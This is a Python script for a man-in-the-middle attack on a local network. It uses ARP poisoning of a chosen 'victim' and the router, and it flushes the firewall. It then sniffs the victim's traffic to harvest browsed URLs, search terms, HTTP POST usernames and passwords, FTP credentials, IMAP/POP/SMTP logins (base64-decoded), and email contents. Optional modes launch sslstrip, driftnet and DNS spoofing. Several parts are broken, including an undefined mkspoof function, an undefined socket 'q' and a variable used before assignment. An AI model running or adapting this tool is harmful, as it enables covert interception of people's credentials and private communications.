#!/usr/bin/python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb=0
#Below is necessary to receive a response to the DHCP packets because we're sending to 255.255.255.255 but receiving from the IP of the DHCP server
conf.checkIPaddr=0
import sys
from threading import Thread
import argparse
import sys
import os
import signal
import base64
from subprocess import *

#Create the arguments
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -uv to print all URLs and without truncation.", action="store_true")
parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning.")
parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
parser.add_argument("-s", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
parser.add_argument("-v", "--verboseURL", help="Shows all URLs the victim visits", action="store_true")
parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
parser.add_argument("-p", "--post", help="Print the URL the victim POSTs to, show usernames/passwords in unsecure HTTP POSTs, show FTP usernames/passwords", action="store_true")
parser.add_argument("-w", "--write", help="Write to logfile", action="store_true")
parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`")
args = parser.parse_args()

#Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

# /dev/null, send output from programs so they don't print to screen.
oldack = None
oldload = None
oldurl = None
oldhttp = None
if args.write:
	logger = open('interceptlog.txt', 'w+')

class Spoof():
	def originalMAC(self, ip):
		# srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
		ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
		for s,r in ans:
			return r.sprintf("%Ether.src%")
	def poison(self, routerIP, victimIP, routerMAC, victimMAC):
		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
	def restore(self, routerIP, victimIP, routerMAC, victimMAC):
		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)

class Parser():

	headersFound = []
	IMAPauth = 0
	IMAPdest = ''
	POPauth = 0
	POPdest = ''

	def start(self, pkt):
		if pkt.haslayer(Raw) and pkt.haslayer(Ether) and pkt.haslayer(TCP):
			if pkt[Ether].src == victimMAC:
				self.URL(pkt)
			self.mailspy(pkt)

	def URL(self, pkt):
		global oldack, oldload, oldurl, oldhttp

		host = None
		get = None
		post = None
		url = None

		#Split the packet between headers and body and grab the URL from the headers
		ack = pkt[TCP].ack
		pktload = repr(pkt[Raw].load).replace("'", "")
		dport = pkt[TCP].dport
		sport = pkt[TCP].sport
		#If you see any other login variable names, tell me and I'll add em in here
		user_regex = '(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&][^&]*))'
		pw_regex = '(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))'
		try:
			headers, body = pktload.split(r"\r\n\r\n")
		except:
			headers = pktload
			body = ''
		header_lines = headers.split(r"\r\n")
		for l in header_lines:
			searchHost = re.search('[Hh]ost: ', l)
			searchGet = re.search('GET /', l)
			searchPost = re.search('POST /', l)
			if searchHost:
				host = l.split(' ')
				host = host[1]
			if searchGet:
				get = l.split(' ')
				get = get[1]
			if searchPost:
				post = l.split(' ')
				post = post[1]
		if host and get:
			url = host+get
		if host and post:
			url = host+post

		#Catch fragmented packet passwords, and FTP passwords
		if args.post:
			#Catch fragmented packet passwords
			if oldack == ack and oldload and oldhttp == 'post':
				combined_load = oldload + pktload
				print B+'[+] fragmented POST:',oldurl,'HTTP POST load:',body+W
				username = re.findall(user_regex, combined_load)
				password = re.findall(pw_regex, combined_load)
				self.user_pass(username, password)
			#Catch FTP passwords
			if dport == 21:
				load = pktload.replace(r"\r\n", "")
				if 'USER ' in load:
					print R+'FTP '+load+W
					if args.write:
						logger.write('FTP'+load+'\n')
				if 'PASS ' in load:
					print R+'FTP '+load+W
					if args.write:
						logger.write('FTP'+load+'\n')

			#Catch search terms, print url, print post loads
			if url != None:
				#Print the URL
				if args.urlspy:
					d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
					if any(i in url for i in d):
						return
					if len(url) > 150:
						print url[:149]
					else:
						print url
				if args.verboseURL:
					print url

				#Catch search terms
				searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|keywords|command)=([^&][^&]*))', url)
				if searched:
					searched = searched.group(3)
					if 'select%20*%20from' in searched:
						pass
					else:
						searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
						print T+'[+] Searched %s for:' % host,searched+W
						if args.write:
							logger.write('[+] Searched %s for: ' % host+searched+'\n')

				#Print POST load
				if post:
					if 'ocsp.' in url:
						print B+'[+] POST:',url+W
					else:
						print B+'[+] POST:',url,'HTTP POST load:',body+W
					if body != '':
						username = re.findall(user_regex, body)
						password = re.findall(pw_regex, body)
						self.user_pass(username, password)
					oldhttp = 'post'

		oldload = pktload
		oldack = ack
		oldurl = url
		if not post:
			oldhttp = None

	host = None
	get = None
	post = None
	url = None

	def user_pass(self, username, password):
		if username:
			for x in username:
				for u in x:
					if '=' in u:
						print R+u+W
						if args.write:
							logger.write(u+'\n')
		if password:
			for y in password:
				for p in y:
					if '=' in p:
						print R+p+W
						if args.write:
							logger.write(p+'\n')

	def mailspy(self, pkt):
		dport = pkt[TCP].dport
		sport = pkt[TCP].sport
		MAC_dst = pkt[Ether].dst
		MAC_src = pkt[Ether].src
		mail_ports = [143, 110, 26]
		if dport in mail_ports or sport in mail_ports:
			load = repr(pkt[Raw].load).replace("'", "")
			try:
				headers, body = load.split(r"\r\n\r\n", 1)
			except:
				headers = load
				body = ''
			header_lines = headers.split(r"\r\n")
			email_headers = ['Date: ', 'Subject: ', 'To: ', 'From: ']
#			Find passwords
			if dport in [110, 143, 26]:
				IP_dst = pkt[IP].dst
				self.passwords(IP_dst, load, dport)
#			Find outgoing messages
			if dport == 26:
				self.outgoing(load, body, header_lines, email_headers, MAC_src)
#			Find incoming msgs
			if MAC_dst == victimMAC:
				if sport in [110, 143]:
					self.incoming(headers, body, header_lines, email_headers)

	def passwords(self, IP_dst, load, dport):
		if dport == 143:
			if self.IMAPauth == 1 and IP_dst == self.IMAPdest:
				print R+'[!] IMAP user and pass found: '+load+W
				if args.write:
					logger.write('[!] IMAP user and pass found: '+load+'\n')
				self.decode(load, dport)
				self.IMAPauth = 0
				self.IMAPdest = ''
			if "authenticate plain" in load:
				self.IMAPauth = 1
				self.IMAPdest = IP_dst
		if dport == 110:
			if self.POPauth == 1 and IP_dst == self.POPdest:
				print R+'[!] POP user and pass found: '+load+W
				if args.write:
					logger.write('[!] POP user and pass found: '+load+'\n')
				self.decode(load, dport)
				self.POPauth = 0
				self.POPdest = ''
			if "AUTH PLAIN" in load:
				self.POPauth = 1
				self.POPdest = IP_dst
		if dport == 26:
			if 'AUTH PLAIN ' in load:
				print R+'[!] POP authentication found: '+load+W
				if args.write:
					logger.write('[!] POP authentication found: '+load+'\n')
				self.decode(load, dport)

	def outgoing(self, headers, body, header_lines, email_headers, MAC_src):
		if MAC_src == victimMAC:
			if 'Message-ID' in headers:
				for l in header_lines:
					for x in email_headers:
						if x in l:
							self.headersFound.append(l)
				if len(self.headersFound) > 3:
					print O+'[!] OUTGOING MESSAGE'+W
					if args.write:
						logger.write('[!] OUTGOING MESSAGE\n')
					for x in self.headersFound:
						print O+'	',x+W
						if args.write:
							logger.write('	'+x+'\n')
					self.headersFound = []
					if body != '':
						print O+'	Message:',body+W
						if args.write:
							logger.write('	Message:'+body+'\n')

	def incoming(self, headers, body, header_lines, email_headers):
		if 'FETCH' not in headers:
			for l in header_lines:
				for x in email_headers:
					if x in l:
						self.headersFound.append(l)
			if len(self.headersFound) > 3:
				print O+'[!] INCOMING MESSAGE'+W
				if args.write:
					logger.write('[!] INCOMING MESSAGE\n')
				for x in self.headersFound:
					print O+'	'+x+W
					if args.write:
						logger.write('	'+x+'\n')
				self.headersFound = []
				if body != '':
					try:
						beginning = body.split(r"\r\n")[0]
						message = str(body.split(r"\r\n\r\n", 1)[1:]).replace('[', '', 1)
						message = message.split(beginning)[0]
						print O+'	Message:', message+W
						if args.write:
							logger.write('	Message:'+message+'\n')
					except:
						print O+'	Couldn\'t format message body:', body+W

	def decode(self, load, dport):
		if dport == 26:
			try:
				b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")
				b64decode = base64.b64decode(b64str)
				print R+'[!] Decoded:'+b64decode+W
				if args.write:
					logger.write('[!] Decoded: '+b64decode+'\n')
			except:
				pass
		else:
			try:
				b64str = load.replace(r"\r\n", "")
				b64decode = base64.b64decode(b64str)
				print R+'[!] Decoded:',b64decode+W
				if args.write:
					logger.write('[!] Decoded: '+b64decode+'\n')
			except:
				pass

class Threads():

	def urlspy(self, victimIP, interface):
#		This is in case you need to test the program without an actual victim
#		sniff(store=0, filter='port 80 or port 21', prn=URL, iface=interface)
		sniff_filter = '(port 80 or port 21 or port 143 or port 110 or port 26) and host %s' % victimIP
		sniff(store=0, filter=sniff_filter, prn=Parser().start, iface=interface)

	def dnsspoof(self, victimIP):
		while 1:
			a=sniff(filter='port 53 and host %s' % victimIP, count=1, promisc=1)
			DNSpkt = a[0]
			if not DNSpkt.haslayer(DNSQR):
				continue
			if args.dnsspoof in DNSpkt.qd.qname:
				send(mkspoof(DNSpkt))
				print G + '[+] Spoofed:', DNSpkt.qd.qname + W

	def sslstrip(self, DN):
		print 'Redirecting traffic to port 10000 and starting sslstrip\n'
		iptables = ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '10000']
		Popen(iptables, stdout=PIPE, stderr=DN)
		xterm = ['xterm', '-e', 'sslstrip', '-f', '-w', 'sslstrip.txt']
		Popen(xterm, stdout=PIPE, stderr=DN)

	def driftnet(self, interface, DN):
		xterm = ['xterm', '-e', 'driftnet', '-i', '%s' % interface]
		Popen(xterm, stdout=PIPE, stderr=DN)

	def start_threads(self, victimIP, interface, DN):
		if args.urlspy or args.verboseURL or args.post:
			u = Thread(target=self.urlspy, args=(victimIP, interface))
			#Make sure the thread closes with the main program on Ctrl-C
			u.daemon = True
			u.start()
		if args.driftnet:
			dr = Thread(target=self.driftnet, args=(interface, DN))
			dr.daemon = True
			dr.start()
		if args.sslstrip:
			ssl = Thread(target=self.sslstrip, args=(DN,))
			ssl.daemon = True
			ssl.start()
		if args.dnsspoof:
			dns = Thread(target=self.dnsspoof, args=(victimIP,))
			dns.daemon = True
			dns.start()

#Print all the variables
def print_vars(interface, DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
	print "[+] Active interface: " + interface
	print "[+] DHCP server: " + DHCPsrvr
	print "[+] DNS server: " + dnsIP
	print "[+] Local domain: " + local_domain
	print "[+] Router IP: " + routerIP
	print "[+] Client IP: " + victimIP


def ip_flush_forward(DN):
	ipfwd = Popen(['cat', '/proc/sys/net/ipv4/ip_forward'], stdout=PIPE, stderr=DN)
	if ipfwd.communicate()[0] != '1\n':
		f = open('/proc/sys/net/ipv4/ip_forward', 'r+')
		f.write('1\n')
		f.close()
		print '[+] Enabled IP forwarding'
	Popen(['iptables', '-F'], stdout=PIPE, stderr=DN)
	Popen(['iptables', '-t', 'nat', '-F'], stdout=PIPE, stderr=DN)
	Popen(['iptables', '-X'], stdout=PIPE, stderr=DN)
	Popen(['iptables', '-t', 'nat', '-X'], stdout=PIPE, stderr=DN)
	print '[+] Flushed the firewall\n'

def main():
	#For use in URL_cb, mailspy respectively
	global victimMAC, victimIP

	#Check if root
	if not os.geteuid()==0:
		sys.exit("\nPlease run as root\n")

	DN = open(os.devnull, 'w')

	if args.ipaddress:
		victimIP = args.ipaddress
	else:
		ans,unans = arping(IPprefix+'*')
		for s,r in ans:
			ips = r.sprintf("%ARP.hwsrc% %ARP.psrc%")
			print ips
		victimIP = raw_input('\nType victim\'s IP: ')
		print ''

	#Find the gateway and interface
	ipr = Popen(['ip', 'route'], stdout=PIPE, stderr=DN)
	ipr = ipr.communicate()[0]
	routerRE = re.search('default via ((\d{2,3}\.\d{1,3}\.\d{1,4}\.)\d{1,3}) \w+ (\w[a-zA-Z0-9]\w[a-zA-Z0-9][0-9]?)', ipr)
	routerIP = routerRE.group(1)
	IPprefix = routerRE.group(2)
	if args.interface:
		interface = args.interface
	else:
		interface = routerRE.group(3)

	print "[+] Checking the DHCP and DNS server addresses..."
	dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff')/
			IP(src="0.0.0.0",dst="255.255.255.255")/
			UDP(sport=68,dport=67)/
			BOOTP(chaddr='E3:2E:F4:DD:8R:9A')/
			DHCP(options=[("message-type","discover"),
				("param_req_list",
				chr(DHCPRevOptions["router"][0]),
				chr(DHCPRevOptions["domain"][0]),
				chr(DHCPRevOptions["server_id"][0]),
				chr(DHCPRevOptions["name_server"][0]),
				), "end"]))
	ans, unans = srp(dhcp, timeout=6, retry=1)
	if ans:
		for s,r in ans:
			DHCPopt = r[0][DHCP].options
			DHCPsrvr = r[0][IP].src
			for x in DHCPopt:
				if 'domain' in x:
					local_domain = x[1]
					pass
				else:
					local_domain = 'None'
				if 'name_server' in x:
					dnsIP = x[1]
	else:
		print "[!] No answer to DHCP packet sent to find the DNS server. Setting DNS and DHCP server to router IP."
		dnsIP = routerIP
		DHCPsrvr = routerIP
		local_domain = 'None'

	print_vars(interface, DHCPsrvr, dnsIP, local_domain, routerIP, victimIP)
	try:
		routerMAC = Spoof().originalMAC(routerIP)
		print "[+] Router MAC: " + routerMAC
	except:
		sys.exit("[!] Could not get router MAC address")
	try:
		victimMAC = Spoof().originalMAC(victimIP)
		print "[+] Victim MAC: " + victimMAC
	except:
		sys.exit("[!] Could not get victim MAC address")
	if not dnsIP == routerIP:
		try:
			dnsMAC = Spoof().originalMAC(dnsIP)
			print "[+] DNS server MAC: " + dnsMAC
		except:
			print "[!] Could not get DNS server MAC address"
			sys.exit("[!] Could not get victim MAC address")

	ip_flush_forward(DN)

	Threads().start_threads(victimIP, interface, DN)

	def signal_handler(signal, frame):
		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
		if args.write:
			logger.close()
		if args.dnsspoof:
			q.unbind(socket.AF_INET)
			q.close()
		if not dnsIP == routerIP:
			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
		Popen(['iptables', '-F'], stdout=PIPE, stderr=DN)
		Popen(['iptables', '-t', 'nat', '-F'], stdout=PIPE, stderr=DN)
		Popen(['iptables', '-X'], stdout=PIPE, stderr=DN)
		Popen(['iptables', '-t', 'nat', '-X'], stdout=PIPE, stderr=DN)
		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
		sys.exit(0)
	signal.signal(signal.SIGINT, signal_handler)


	while 1:

		Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
		if not dnsIP == routerIP:
			Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
		time.sleep(1.5)

if __name__ == "__main__":
	main()



#To do:
#use iptables to block dns responses from the router to prevent race condition in dns spoofing
